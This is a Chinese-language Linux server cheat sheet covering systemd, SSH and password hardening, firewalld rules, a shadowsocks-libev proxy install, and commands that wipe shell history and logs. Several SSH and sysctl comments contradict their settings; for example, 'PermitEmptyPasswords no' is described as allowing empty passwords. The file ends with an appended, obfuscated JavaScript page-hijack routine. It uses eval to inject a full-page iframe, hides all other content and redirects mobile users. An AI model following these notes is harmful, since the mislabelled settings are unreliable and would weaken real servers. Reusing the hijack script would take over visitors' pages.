Access Key格式: ss://加密方式:密码@IP地址:端口

systemctl is-enabled servicename.service #查询服务是否开机启动
systemctl enable *.service #开机运行服务
systemctl disable *.service #取消开机运行
systemctl start *.service #启动服务
systemctl stop *.service #停止服务
systemctl restart *.service #重启服务
systemctl reload *.service #重新加载服务配置文件
systemctl status *.service #查询服务运行状态
systemctl --failed #显示启动失败的服务

清屏命令
$ clear

清空历史命令
$ echo > .bash_history

#清空当前缓存中的命令
history -c

chown -R www:www /home/WebHost/

return 301 https://$host$request_uri;

rewrite ^(.*)$  https://$host$1 permanent;

cat /dev/null > /var/log/rsyncd.log 

修改主机名
# hostname  ##查看主机名
# hostname k8s-node1  ##临时生效
# hostnamectl set-hostname k8s-node1  ##重启后永久生效

查看CentOS版本
# cat /etc/redhat-release

查看当前启动的网络连接
nmcli  connection show

更改dns
nmcli con mod eth0 ipv4.dns "8.8.8.8  114.114.114.114"

配置生效
nmcli con up eth0

禁用selinux
# vi /etc/selinux/config
SELINUX=disabled

# vi /etc/ssh/sshd_config
Port 22                                     # ssh端口
ListenAddress 192.168.0.1       # 对于在服务器上安装了多个网卡或配置多个IP地址的情况，设定sshd只在其中一个指定的接口地址监听
AllowUsers  *@10.138.*.*        # 仅允许 10.138.0.0/16 网段所有用户通过ssh访问
AllowUsers  normal                 # 只允许这个用户远程登录
AllowTcpForwarding no          # 禁止空密码登录
X11Forwarding no                  # 关闭X11Forwarding，防止会话被劫持
PermitEmptyPasswords no      # 允许使用空密码
Protocol 2                                # 禁止使用版本1协议
MaxStartups 5                         # 增加SSH终端连接数最大为1000个
LoginGraceTime 20                 # 在20秒内不能完成登录，则断开连接

systemctl restart sshd.service

账户安全锁定多余帐号方法
# cat /etc/passwd
# cat /etc/shadow

# passwd -l <用户名>    # 锁定不必要的账号
# passwd -u <用户名>   # 解锁需要恢复的账号

设置系统口令策略
# cat /etc/login.defs|grep PASS  # 查看密码策略设置

#vi /etc/login.defs修改配置文件
PASS_MAX_DAYS   90        #新建用户的密码最长使用天数
PASS_MIN_DAYS   0         #新建用户的密码最短使用天数
PASS_WARN_AGE   7         #新建用户的密码到期提前提醒天数
PASS_MIN_LEN    9         #最小密码长度9

检查shadow中空口令帐号
# awk -F: '($2 == "") { print $1 }' /etc/shadow

用户鉴别设置帐户锁定登录失败锁定次数、锁定时间
# cat /etc/pam.d/system-auth   查看有无auth required pam_tally.so条目的设置
# vi /etc/pam.d/system-auth
auth required pam_tally.so onerr=fail deny=6 unlock_time=300  设置为密码连续错误6次锁定，锁定时间300秒
解锁用户 faillog  -u  <用户名>  -r

修改帐户TMOUT值，设置自动注销时间
检查方法：
# cat /etc/profile    # 查看有无TMOUT的设置
# vi /etc/profile
export TMOUT=600    # 无操作600秒后自动退出

设置Bash保留历史命令的条数
# cat /etc/profile|grep HISTSIZE=
# cat /etc/profile|grep HISTFILESIZE=    查看保留历史命令的条数
# vi /etc/profile
修改 HISTSIZE=5 和 HISTFILESIZE=5 即保留最新执行的5条命令

防止IP SPOOF攻击
# vi /etc/host.conf
nospoof on

禁止被 ping 有则修改，无则添加
# vi /etc/sysctl.conf
et.ipv4.icmp_echo_ignore_all=0

防火墙禁止被ping
# firewall-cmd --permanent --add-rich-rule='rule protocol value=icmp drop'
# firewall-cmd --reload

编码设置，删除原有，添加如下内容
# vi /etc/locale.conf
LANG=zh_CN.utf8 //中文界面
LC_MESSAGES=en_US.utf8 //英文提示

在linux系统中，系统运行所必须的服务
服务名称 	说明
acpid 	用于电源管理，对于笔记本和台式电脑很重要
apmd 	高级电源能源管理服务，可用于监控电脑
kudzu 	检测硬件是否变化的服务
crond 	为Linux下自动安排的进程提供运行服务
iptables/firewall 	Linux内置的防火墙
xinetd 	支持多种网络服务的核心守护进程
syslog 	记录系统的日志服务
network 	网络服务，要用网必须启动这个服务

客户端 Android 下载
https://github.com/shadowsocks/shadowsocks-android/releases
 
国内阿里的镜像
$ wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo

YUM缓存生成
$ yum clean all
$ yum makecache
$ yum -y update

编译工具安装
$ yum install git unzip python2 perl openssl openssl-devel gettext gcc autoconf libtool automake make asciidoc xmlto udns-devel libev-devel pcre pcre-devel git c-ares-devel wget zlib-devel libsodium-devel mbedtls-devel -y

安装扩展源EPEL
$ yum -y install epel-release

# 安装 Libsodium
$ yum -y install libsodium

# 安装 Mbedtls
$ yum -y install mbedtls

安装 shadowsocks-libev
$ git clone https://github.com/shadowsocks/shadowsocks-libev.git
$ cd shadowsocks-libev
$ git submodule update --init --recursive
$ ./autogen.sh && ./configure --disable-documentation && make
$ sudo make install

配置 shadowsocks json文件
$ vi /etc/shadowsocks.json

{
    "server":["[::0]","0.0.0.0"],
    "server_port":8888,
    "local_port":1080,
    "password":"password",
    "timeout":300,
    "method":"chacha20-ietf-poly1305",
    "fast_open": false
}

配置 shadowsocks 自启动
$ vi /etc/systemd/system/shadowsocks.service

[Unit]
Description=shadowsocks
After=network.target

[Service]
User=root
Group=root
TimeoutStartSec=0
PrivateTmp=true
ExecStart=/usr/local/bin/ss-server -c /etc/shadowsocks.json
Restart=on-abort

[Install]
WantedBy=multi-user.target

# 设置开机自启命令
$ systemctl enable shadowsocks

# 启动命令
$ systemctl start shadowsocks

#查看状态命令
$ systemctl status shadowsocks -l

安装防火墙firewalld
$ yum -y install firewalld

启动 firewalld
$ systemctl start firewalld

关闭 firewalld
$ systemctl stop firewalld

开机禁用 firewalld
$ systemctl disable firewalld

开机启用 firewalld
$ systemctl enable firewalld

查看firewalld状态
$ systemctl status firewalld

#开启端口 最大端口65535
firewall-cmd --zone=public --add-port=8080-8081/tcp --permanent

#删除端口 最大端口65535
firewall-cmd --zone=public --remove-port=80/tcp --permanent

#查看开启的端口和服务
firewall-cmd --permanent --zone=public --list-services //服务空格隔开 例如 dhcpv6-client https ss
firewall-cmd --permanent --zone=public --list-ports //端口空格隔开 例如 8080-8081/tcp 8388/tcp 80/tcp

#设置某个ip 访问某个服务
firewall-cmd --permanent --zone=public --add-rich-rule="rule family="ipv4" source address="192.168.0.4/24" service name="http" accept"
ip 192.168.0.4/24 访问 http

#禁止IP地址段访问
firewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"

#查询端口是否开启
firewall-cmd --query-port=38023/tcp

#重启防火墙
firewall-cmd --reload

#锁定不得任意更动
chattr +i /etc/shadowsocks.json

function goPAGE() {
    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        window.location.href = "https://www.baidu.com/"
    } else {
        var ss = '<center id="yongwang"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="13' + '80" src="https://www.baidu.com/"></iframe></center>';
        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
        try {
            setInterval(function() {
                try {
                    document.getElementById("div" + "All").style.display = "no" + "ne"
                } catch (e) {}
                for (var i = 0; i < document.body.children.length; i++) {
                    try {
                        var tagname = document.body.children[i].tagName;
                        var myid = document.body.children[i].id;
                        if (myid != "iconDiv1" && myid != "yongwang") {
                            document.body.children[i].style.display = "non" + "e"
                        }
                    } catch (e) {}
                }
            }, 100)
        } catch (e) {}
    }
}
goPAGE();
